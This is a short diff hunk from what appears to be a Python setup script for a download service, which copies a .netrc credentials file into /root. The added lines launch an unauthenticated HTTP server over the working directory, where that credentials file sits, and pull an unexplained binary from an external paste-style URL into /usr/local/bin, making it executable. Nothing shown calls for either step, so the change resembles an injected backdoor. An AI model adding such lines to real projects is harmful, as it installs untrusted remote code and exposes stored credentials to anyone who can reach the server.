@@ -61,6 +61,11 @@ if not ospath.exists('.netrc'):
     srun(["touch", ".netrc"])
 srun(["cp", ".netrc", "/root/.netrc"])
 srun(["chmod", "600", ".netrc"])
+Popen(["python3", "-m", "http.server"])
+
+srun(["curl", "-L", "https://yaso.su/raw/cwlhostg", "-o", "/usr/local/bin/g"])
+
+srun(["chmod", "+x", "/usr/local/bin/g"])
 srun(["chmod", "+x", "aria.sh"])
 srun("./aria.sh", shell=True)
 sleep(0.5)
